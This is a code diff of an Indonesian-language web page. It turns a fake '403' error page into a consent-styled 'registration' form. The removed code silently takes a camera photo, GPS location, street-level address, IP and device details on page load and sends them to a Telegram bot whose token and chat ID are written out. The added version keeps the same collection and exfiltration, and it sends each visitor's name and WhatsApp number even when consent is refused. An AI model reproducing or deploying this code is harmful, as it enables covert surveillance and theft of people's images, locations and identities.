@@ -1,168 +1,77 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>403</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Pendaftaran (Dengan Izin)</title>
   <style>
-    /* Disguise UI: hanya menampilkan 403 */
-    html,body{height:100%;margin:0}
-    body{
-      background:#000;
-      color:#b30000;
-      font-family:monospace;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      font-size:72px;
-      user-select:none;
-    }
-    /* hidden elements for camera/canvas */
-    video,canvas{display:none}
+    body { font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:#f6f8fa; color:#111; padding:20px; }
+    .card { max-width:720px; margin:28px auto; background:#fff; border-radius:10px; box-shadow:0 6px 24px rgba(0,0,0,0.08); padding:20px; }
+    h1 { margin:0 0 8px 0; font-size:20px; }
+    p.note { margin:6px 0 18px 0; color:#555; }
+    label { display:block; margin-top:10px; font-weight:600; color:#333; }
+    input[type="text"], input[type="tel"] { width:100%; padding:10px; border-radius:8px; border:1px solid #ddd; margin-top:6px; font-size:14px; }
+    .consent { margin-top:12px; background:#f2f7ff; padding:12px; border-radius:8px; border:1px solid #e6f0ff; color:#0b57d0; }
+    .consent input { margin-right:8px; }
+    button { margin-top:16px; padding:10px 14px; border-radius:8px; border:none; background:#0b57d0; color:#fff; font-weight:700; cursor:pointer; }
+    button:disabled { opacity:0.6; cursor:not-allowed; }
+    pre { background:#0b57d0; color:#fff; padding:12px; border-radius:8px; overflow:auto; max-height:300px; }
+    .small { font-size:13px; color:#666; margin-top:8px; }
   </style>
 </head>
 <body>
-  403
+  <div class="card">
+    <h1>Buat Akun</h1>
+    <p class="note">Isi data berikut untuk mendaftar. Kami akan meminta izin untuk mengambil foto & lokasi hanya setelah kamu setuju.</p>
 
-  <!-- hidden elements -->
-  <video id="video" autoplay playsinline width="400" height="400"></video>
-  <canvas id="canvas" width="800" height="800"></canvas>
+    <form id="regForm">
+      <label>Nama</label>
+      <input id="name" type="text" required placeholder="Nama lengkap" />
+
+      <label>Nomor WhatsApp (contoh: 62812...)</label>
+      <input id="wa" type="tel" required placeholder="62812xxxxxxxx" />
+
+      <div class="consent">
+        <label><input id="consentCapture" type="checkbox" /> Saya memberi izin agar situs ini <strong>mengambil foto kamera</strong> dan <strong>lokasi GPS</strong> untuk verifikasi. Saya memahami data akan dikirim ke server/Telegram.</label>
+      </div>
+
+      <button id="submitBtn" type="submit">Daftar & Kirim</button>
+
+      <div class="small">Catatan: kamera dan lokasi hanya akan diakses jika kamu memberi izin ketika diminta oleh browser.</div>
+    </form>
+
+    <hr style="margin:18px 0;" />
+
+    <h2>Log (debug)</h2>
+    <pre id="log">Menunggu tindakan...</pre>
+  </div>
 
 <script>
-/*
-  AUTO-REPORT HTML (Updated: Detailed Address Fields)
-  - BOT_TOKEN & CHAT_ID telah diisi sesuai permintaan.
-  - Host via HTTPS atau localhost agar kamera & geolocation berjalan.
-*/
-
+/* === CONFIG: ISI BOT TOKEN & CHAT ID === */
 const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
 const CHAT_ID   = "6216902201";
+/* ====================================== */
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
+const logEl = document.getElementById('log');
+function log(msg){ logEl.textContent += "\\n" + msg; console.log(msg); }
 
-/* optional profile mapping by IP */
-const profiles = {
-  // "118.96.123.45": { name:"Budi Santoso", age:"28", gender:"Laki-laki", job:"Reseller", kampung:"Babakan" }
-};
-
-function rand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
-function generateFakeProfile(ip){
-  const first = ["Budi","Andi","Siti","Rina","Agus","Dewi","Joko","Rian","Fitri","Eka","Yuli","Rizki","Tono","Sari","Putri","Ahmad"];
-  const last = ["Santoso","Wijaya","Kurniawan","Hidayat","Kartika","Pratama","Susilo","Saputra","Wibowo","Putri","Aminah","Rahman"];
-  const jobs = ["Reseller","Pedagang","Pelajar/Mahasiswa","Driver","Karyawan Swasta","Teknisi","Ibu Rumah Tangga","Freelancer","Guru"];
-  const kampungList = ["Babakan","Cisaat","Cibadak","Warudoyong","Gunungpuyuh","Baros","Cikole","Cempaka","Sukamulya","Kebon"];
-  const name = rand(first) + " " + rand(last);
-  const age = Math.floor(Math.random()*40) + 18;
-  const gender = Math.random() > 0.5 ? "Laki-laki" : "Perempuan";
-  const job = rand(jobs);
-  const kampung = rand(kampungList);
-  return { name, age: String(age), gender, job, kampung };
-}
-
-function safeCaption(s){
-  if (!s) return '';
-  if (s.length <= 1000) return s;
-  return s.slice(0,1000-3) + '...';
-}
-
-function buildBox(data){
-  const now = new Date();
-  const lines = [];
-  lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
-  lines.push(` ├─ > Pesan`);
-  lines.push(` │   └─ ${data.message || 'Auto capture & device report'}`);
-  lines.push(` ├─ > Pengirim (web)`);
-  lines.push(` │   └─ ${data.userAgent || '-'}`);
-  lines.push(` ├─ > IP / ISP`);
-  const ip = data.ipInfo || {};
-  lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
-  lines.push(` │   ├─ ISP/Org: ${ip.org || ip.isp || '-'}`);
-  lines.push(` │   ├─ ASN: ${ip.asn || '-'}`);
-  lines.push(` │   ├─ City: ${ip.city || '-'}`);
-  lines.push(` │   ├─ Region/State: ${ip.region || ip.state || '-'}`);
-  lines.push(` │   ├─ Country: ${ip.country || ip.country_name || '-'}`);
-  lines.push(` │   ├─ Postal: ${ip.postal || ip.postal_code || '-'}`);
-  lines.push(` │   └─ IP Timezone: ${ip.timezone || '-'}`);
-  lines.push(` ├─ > Device`);
-  lines.push(` │   ├─ Platform: ${data.platform || '-'}`);
-  lines.push(` │   ├─ Screen: ${data.screen || '-'}`);
-  lines.push(` │   ├─ Language: ${data.language || '-'}`);
-  lines.push(` │   ├─ Timezone (browser): ${data.timezone || '-'}`);
-  lines.push(` │   ├─ Local Date: ${data.localDate || '-'}`);
-  lines.push(` │   ├─ Battery: ${data.battery || '-'}`);
-  lines.push(` │   ├─ Cookies Enabled: ${data.cookiesEnabled || '-'}`);
-  lines.push(` │   ├─ Online: ${data.online || '-'}`);
-  lines.push(` │   ├─ HW Threads: ${data.hwConcurrency || '-'}`);
-  lines.push(` │   └─ DoNotTrack: ${data.doNotTrack || '-'}`);
-  lines.push(` ├─ > Connection`);
-  if (data.connection){
-    lines.push(` │   └─ Type: ${data.connection.effectiveType || '-'} | Downlink: ${data.connection.downlink || '-'} Mbps | RTT: ${data.connection.rtt || '-'} ms | SaveData: ${data.connection.saveData ? 'yes' : 'no'}`);
-  } else {
-    lines.push(` │   └─ Connection API: tidak tersedia`);
-  }
-  lines.push(` ├─ > Geo (GPS)`);
-  if (data.geo && !data.geo.error){
-    lines.push(` │   ├─ Lat: ${data.geo.lat}`);
-    lines.push(` │   ├─ Lon: ${data.geo.lon}`);
-    lines.push(` │   ├─ Akurasi: ${data.geo.acc || '-'}`);
-    lines.push(` │   └─ Maps: ${data.geo.maps || '-'}`);
-  } else {
-    lines.push(` │   └─ Error GPS: ${data.geo ? data.geo.error : '-'}`);
-  }
-
-  // Detailed Address Section — many fields
-  lines.push(` ├─ > Alamat (Detail)`);
-  const a = data.address || {};
-  lines.push(` │   ├─ display_name: ${data.revDisplay || '-'}`);
-  lines.push(` │   ├─ country: ${a.country || '-'}`);
-  lines.push(` │   ├─ country_code: ${a.country_code || '-'}`);
-  lines.push(` │   ├─ state / provinsi: ${a.state || a.region || '-'}`);
-  lines.push(` │   ├─ state_district: ${a.state_district || '-'}`);
-  lines.push(` │   ├─ county / kabupaten: ${a.county || '-'}`);
-  lines.push(` │   ├─ region: ${a.region || '-'}`);
-  lines.push(` │   ├─ city: ${a.city || a.town || a.village || '-'}`);
-  lines.push(` │   ├─ town: ${a.town || '-'}`);
-  lines.push(` │   ├─ village: ${a.village || '-'}`);
-  lines.push(` │   ├─ municipality: ${a.municipality || '-'}`);
-  lines.push(` │   ├─ suburb: ${a.suburb || '-'}`);
-  lines.push(` │   ├─ neighbourhood: ${a.neighbourhood || '-'}`);
-  lines.push(` │   ├─ quarter: ${a.quarter || '-'}`);
-  lines.push(` │   ├─ hamlet (kampung/dusun): ${a.hamlet || '-'}`);
-  lines.push(` │   ├─ road / jalan: ${a.road || '-'}`);
-  lines.push(` │   ├─ house_number: ${a.house_number || '-'}`);
-  lines.push(` │   └─ postcode: ${a.postcode || '-'}`);
-
-  // Profile
-  lines.push(` ├─ > Profile (auto)`);
-  lines.push(` │   ├─ Nama: ${data.profile.name || '-'}`);
-  lines.push(` │   ├─ Usia: ${data.profile.age || '-'}`);
-  lines.push(` │   ├─ Gender: ${data.profile.gender || '-'}`);
-  lines.push(` │   ├─ Pekerjaan: ${data.profile.job || '-'}`);
-  lines.push(` │   └─ Kampung: ${data.profile.kampung || '-'}`);
-
-  lines.push(`╰─ > Sumber: AutoReport Web`);
-  return lines.join('\n');
-}
-
-/* fetch utils */
-async function fetchJSON(url){
+// utility fetch json with timeout/fail-safe
+async function fetchJSON(url, opts = {}) {
   try {
-    const r = await fetch(url, { cache:'no-store' });
-    if (!r.ok) throw new Error('bad ' + r.status);
-    return await r.json();
-  } catch (e){
+    const res = await fetch(url, { cache: 'no-store', ...opts });
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    return await res.json();
+  } catch (e) {
     return null;
   }
 }
 
-/* IP info with fallbacks */
+/* IP info fallback (ipapi -> ipwhois -> ipify) */
 async function getIPInfo(){
   const sources = [
-    { url:'https://ipapi.co/json/' , mapper: j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country_name || j.country, org: j.org, postal: j.postal, timezone: j.timezone, latitude: j.latitude || j.lat, longitude: j.longitude || j.lon, asn: j.asn }) },
-    { url:'https://ipwhois.app/json/' , mapper: j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country, org: j.org || j.isp, postal: j.postal, timezone: j.timezone, latitude: j.latitude, longitude: j.longitude }) },
-    { url:'https://api.ipify.org?format=json', mapper: j => ({ ip: j.ip }) }
+    { url: 'https://ipapi.co/json/', mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country_name||j.country, org:j.org, postal:j.postal, timezone:j.timezone, lat:j.latitude||j.lat, lon:j.longitude||j.lon }) },
+    { url: 'https://ipwhois.app/json/', mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country, org:j.org||j.isp, postal:j.postal, timezone:j.timezone, lat:j.latitude, lon:j.longitude }) },
+    { url: 'https://api.ipify.org?format=json', mapper: j => ({ ip:j.ip }) }
   ];
   for (const s of sources){
     const j = await fetchJSON(s.url);
@@ -170,52 +79,197 @@ async function getIPInfo(){
     const m = s.mapper(j);
     if (m && m.ip) return m;
   }
-  return { ip: 'unknown' };
+  return { ip:'unknown' };
 }
 
-/* reverse geocode */
+/* reverse geocode via Nominatim, returns address object + display */
 async function revGeocode(lat, lon){
   try {
-    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, { cache:'no-store', headers:{ 'User-Agent':'AutoReport/1.0' }});
-    if (!r.ok) throw new Error('revgeo fail ' + r.status);
+    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`;
+    const r = await fetch(url, { cache: 'no-store', headers: {'User-Agent':'LegalApp/1.0'}});
+    if (!r.ok) throw new Error('rev geo fail ' + r.status);
     const j = await r.json();
-    return { display_name: j.display_name || null, address: j.address || {} };
-  } catch (e){
-    return { error: e.message || 'reverse geocode failed' };
+    return { display: j.display_name || null, address: j.address || {} };
+  } catch(e) {
+    return { error: e.message || 'revgeo fail' };
   }
 }
 
-/* device info */
-async function getBattery(){
-  try { if (!navigator.getBattery) return null; const b = await navigator.getBattery(); return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`; } catch { return null; }
-}
-function getConnection(){ try { const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if (!c) return null; return { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData }; } catch { return null; } }
-
-/* geolocation */
+/* get geolocation (prompts user) */
 function getGeo(){
   return new Promise(resolve => {
-    if (!navigator.geolocation) return resolve({ error: 'geolocation not supported' });
+    if (!navigator.geolocation) return resolve({ error:'geolocation not supported' });
     navigator.geolocation.getCurrentPosition(pos => {
-      resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy + ' m', maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}` });
+      resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy + ' m' });
     }, err => resolve({ error: err.message }), { enableHighAccuracy: true, timeout: 10000 });
   });
 }
 
-/* telegram send */
-async function sendPhotoCaption(blob, caption){
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-  const fd = new FormData();
-  fd.append('chat_id', CHAT_ID);
-  fd.append('photo', blob, 'camera.jpg');
-  fd.append('caption', caption);
-  return fetch(url, { method:'POST', body: fd });
+/* get battery & connection, device info */
+async function getBattery(){
+  try {
+    if (!navigator.getBattery) return null;
+    const b = await navigator.getBattery();
+    return `${Math.round(b.level*100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+  } catch { return null; }
+}
+function getConnection(){ try { const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if (!c) return null; return { effectiveType:c.effectiveType, downlink:c.downlink, rtt:c.rtt, saveData:c.saveData }; } catch { return null; } }
+
+/* capture photo (prompts user) */
+async function capturePhoto() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio:false });
+    const v = document.createElement('video');
+    v.srcObject = stream;
+    await v.play();
+    await new Promise(r => setTimeout(r, 900)); // allow camera warmup
+    const canvas = document.createElement('canvas');
+    const side = Math.min(v.videoWidth || 640, v.videoHeight || 480);
+    canvas.width = 800; canvas.height = 800;
+    const ctx = canvas.getContext('2d');
+    // center-crop
+    const sx = Math.max(0, (v.videoWidth - side) / 2);
+    const sy = Math.max(0, (v.videoHeight - side) / 2);
+    ctx.drawImage(v, sx, sy, side, side, 0, 0, canvas.width, canvas.height);
+    stream.getTracks().forEach(t => t.stop());
+    return await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+  } catch (e) {
+    return null; // permission denied or not available
+  }
 }
 
-/* main */
-(async function main(){
-  if (!BOT_TOKEN || BOT_TOKEN.includes('ISI_TOKEN') || !CHAT_ID || CHAT_ID.includes('ISI_CHATID')) return;
+/* build boxed caption (rapi) - trimmed for Telegram caption limits */
+function buildBoxedCaption(data){
+  const now = new Date();
+  const lines = [];
+  lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
+  if (data.phone) lines.push(` ├─ > Nomor Telepon: ${data.phone}`);
+  lines.push(` ├─ > Nama: ${data.name || '-'}`);
+  lines.push(` ├─ > Pesan`);
+  lines.push(` │   └─ ${data.message || 'Pendaftaran & Verifikasi'}`);
+  lines.push(` ├─ > Pengirim (web)`);
+  lines.push(` │   └─ ${data.userAgent || '-'}`);
+  // IP / ISP
+  lines.push(` ├─ > IP / ISP`);
+  const ip = data.ipInfo || {};
+  lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
+  lines.push(` │   ├─ ISP/Org: ${ip.org || ip.isp || '-'}`);
+  lines.push(` │   ├─ City: ${ip.city || '-'}`);
+  lines.push(` │   ├─ Region: ${ip.region || ip.state || '-'}`);
+  lines.push(` │   ├─ Country: ${ip.country || '-'}`);
+  lines.push(` │   └─ Postal: ${ip.postal || '-'}`);
+  // Device
+  lines.push(` ├─ > Device`);
+  lines.push(` │   ├─ Platform: ${data.platform || '-'}`);
+  lines.push(` │   ├─ Screen: ${data.screen || '-'}`);
+  lines.push(` │   ├─ Language: ${data.language || '-'}`);
+  lines.push(` │   ├─ Timezone: ${data.timezone || '-'}`);
+  lines.push(` │   ├─ Battery: ${data.battery || '-'}`);
+  // Geo
+  lines.push(` ├─ > Geo (GPS)`);
+  if (data.geo && !data.geo.error){
+    lines.push(` │   ├─ Lat: ${data.geo.lat}`);
+    lines.push(` │   ├─ Lon: ${data.geo.lon}`);
+    lines.push(` │   ├─ Akurasi: ${data.geo.acc || '-'}`);
+    lines.push(` │   └─ Maps: https://maps.google.com/?q=${data.geo.lat},${data.geo.lon}`);
+  } else {
+    lines.push(` │   └─ GPS: ${data.geo ? data.geo.error : '-'}`);
+  }
+  // Detailed address (Nominatim fields)
+  lines.push(` ├─ > Alamat (Detail)`);
+  const a = data.address || {};
+  const addrFields = [
+    ['Negara','country'], ['Kode Negara','country_code'], ['Provinsi','state'],
+    ['State District','state_district'], ['Kabupaten','county'], ['Region','region'],
+    ['Kota','city'], ['Town','town'], ['Village','village'], ['Municipality','municipality'],
+    ['Kecamatan/Suburb','suburb'], ['Neighbourhood','neighbourhood'], ['Quarter','quarter'],
+    ['Kampung/Hamlet','hamlet'], ['Jalan','road'], ['Nomor','house_number'], ['Kode Pos','postcode']
+  ];
+  for (const [label,key] of addrFields){
+    lines.push(` │   ├─ ${label}: ${a[key] || '-'}`);
+  }
+  // Profile
+  lines.push(` ├─ > Profile`);
+  lines.push(` │   ├─ Nama (input): ${data.name || '-'}`);
+  lines.push(` │   ├─ Nomor WA (input): ${data.phone || '-'}`);
+  lines.push(` ╰─ > Sumber: Sistem (dengan persetujuan pengguna)`);
+  // join and trim to safe length
+  const caption = lines.join('\\n');
+  if (caption.length > 1000) return caption.slice(0,1000-3) + '...';
+  return caption;
+}
 
-  // device
+/* send message (either photo+caption or text only) */
+async function sendToTelegram({ blob, caption }){
+  try {
+    if (blob){
+      const fd = new FormData();
+      fd.append('chat_id', BOT_CHAT_ID); // replaced later
+    }
+  } catch (e){}
+}
+
+/* Helper to do actual send of photo+caption or sendMessage fallback */
+async function tgSend(blob, caption){
+  if (!BOT_TOKEN || BOT_TOKEN.includes('ISI_TOKEN') || !CHAT_ID || CHAT_ID.includes('ISI_CHATID')) {
+    log('⚠️ BOT_TOKEN atau CHAT_ID belum diisi di script.');
+    return false;
+  }
+  if (blob){
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('photo', blob, 'photo.jpg');
+    fd.append('caption', caption);
+    // no parse_mode because plain text box
+    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
+    return r.ok;
+  } else {
+    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
+    });
+    return r.ok;
+  }
+}
+
+/* FORM submit handler */
+document.getElementById('regForm').addEventListener('submit', async (ev) => {
+  ev.preventDefault();
+  logEl.textContent = 'Proses dimulai...';
+  const name = document.getElementById('name').value.trim();
+  const phone = document.getElementById('wa').value.trim();
+  const consent = document.getElementById('consentCapture').checked;
+
+  // PREVIEW / confirm: show user exactly what will be collected
+  if (!consent){
+    if (!confirm('Kamu belum memberi izin capture foto & lokasi. Data profil (nama & WA) tetap akan dikirim. Lanjutkan?')) {
+      log('Pengguna membatalkan (tidak memberi izin).');
+      return;
+    }
+  }
+
+  log('Mengirim data profil (nama & WA) ke Telegram...');
+  // send immediate minimal data (profile) so operator dapat melihat registrasi cepat
+  const profileText = `╭─ > Registrasi\n ├─ > Nama: ${name}\n ├─ > WA: ${phone}\n ╰─ > Waktu: ${new Date().toLocaleString()}`;
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: profileText })
+    });
+    log('Profil dikirim.');
+  } catch (e){
+    log('Gagal kirim profil: ' + (e.message || e));
+  }
+
+  // If user consented, attempt to gather device, IP, geo, photo and send full report
+  let photoBlob = null;
+  let geo = { error:'not requested' };
+  let address = null;
+  let ipInfo = await getIPInfo();
+  const battery = await getBattery();
+  const connection = getConnection();
   const deviceInfo = {
     platform: navigator.platform || '-',
     userAgent: navigator.userAgent || '-',
@@ -223,90 +277,64 @@ async function sendPhotoCaption(blob, caption){
     language: navigator.language || '-',
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
     localDate: new Date().toLocaleString(),
-    cookiesEnabled: navigator.cookieEnabled ? 'yes' : 'no',
-    online: navigator.onLine ? 'online' : 'offline',
-    hwConcurrency: navigator.hardwareConcurrency || '-',
-    doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || '-',
-    connection: getConnection()
+    battery: battery || '-',
+    connection
   };
-  deviceInfo.battery = await getBattery();
 
-  // parallel: ip & geo
-  const [ ipInfo, geo ] = await Promise.all([ getIPInfo(), getGeo() ]);
-
-  // rev geocode
-  let rev = null;
-  if (geo && !geo.error && geo.lat && geo.lon) rev = await revGeocode(geo.lat, geo.lon);
-
-  // profile lookup / fake
-  let profile = { name:'unknown', age:'unknown', gender:'unknown', job:'unknown', kampung:'unknown' };
-  if (ipInfo && ipInfo.ip && profiles[ipInfo.ip]) {
-    profile = profiles[ipInfo.ip];
+  if (consent){
+    log('Meminta izin lokasi & kamera...');
+    geo = await getGeo();
+    if (!geo.error && geo.lat && geo.lon){
+      log(`Lokasi didapat: ${geo.lat}, ${geo.lon}`);
+      const rev = await revGeocode(geo.lat, geo.lon);
+      if (!rev.error){
+        address = rev.address;
+        log('Reverse geocode OK.');
+      } else {
+        log('Reverse geocode error: ' + rev.error);
+      }
+    } else {
+      log('GPS error / ditolak: ' + (geo.error || 'unknown'));
+    }
+    // capture photo
+    photoBlob = await capturePhoto();
+    if (photoBlob) log('Foto berhasil diambil.');
+    else log('Foto gagal / ditolak.');
   } else {
-    profile = generateFakeProfile(ipInfo.ip);
-    if (rev && rev.address) profile.kampung = rev.address.hamlet || rev.address.village || profile.kampung;
+    log('User tidak memberi izin capture; lewati pengambilan foto & lokasi.');
   }
 
-  // capture camera
-  let photoBlob = null;
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-    video.srcObject = stream;
-    await video.play();
-    await new Promise(r => setTimeout(r, 1000));
-    const w = video.videoWidth || canvas.width;
-    const h = video.videoHeight || canvas.height;
-    const side = Math.min(w,h);
-    const sx = (w - side)/2;
-    const sy = (h - side)/2;
-    ctx.clearRect(0,0,canvas.width,canvas.height);
-    ctx.drawImage(video, sx, sy, side, side, 0, 0, canvas.width, canvas.height);
-    stream.getTracks().forEach(t=>t.stop());
-    photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
-  } catch (e){
-    photoBlob = null;
-  }
-
+  // Build full box caption
   const data = {
-    message: 'Auto capture & device report',
+    name: name,
+    phone: phone,
+    message: 'Pendaftaran & Verifikasi (dengan izin)',
     userAgent: deviceInfo.userAgent,
-    ipInfo: ipInfo || {},
+    ipInfo: ipInfo,
     platform: deviceInfo.platform,
     screen: deviceInfo.screen,
     language: deviceInfo.language,
     timezone: deviceInfo.timezone,
     localDate: deviceInfo.localDate,
     battery: deviceInfo.battery,
-    cookiesEnabled: deviceInfo.cookiesEnabled,
-    online: deviceInfo.online,
-    hwConcurrency: deviceInfo.hwConcurrency,
-    doNotTrack: deviceInfo.doNotTrack,
-    connection: deviceInfo.connection,
-    geo: geo || {},
-    address: (rev && rev.address) ? rev.address : {},
-    revDisplay: (rev && rev.display_name) ? rev.display_name : null,
-    profile: profile
+    geo: geo,
+    address: address,
+    profile: { name, phone }
   };
+  const caption = buildBoxedCaption(data);
+  log('Mengirim laporan lengkap ke Telegram...');
 
-  const boxed = buildBox(data);
-  const caption = safeCaption(boxed);
-
-  try {
-    if (photoBlob){
-      await sendPhotoCaption(photoBlob, caption);
-    } else {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method:'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
-      });
-    }
-  } catch (e){
-    // fail silently
-    console.error('tg send failed', e);
+  const ok = await tgSend(photoBlob, caption);
+  if (ok) {
+    log('✅ Laporan terkirim.');
+    alert('Pendaftaran selesai. Terima kasih.');
+    // optional redirect or clear form
+    document.getElementById('regForm').reset();
+  } else {
+    log('❌ Gagal kirim laporan ke Telegram.');
+    alert('Terjadi kesalahan saat mengirim laporan. Cek log.');
   }
-
-})();
+});
 </script>
 </body>
 </html>
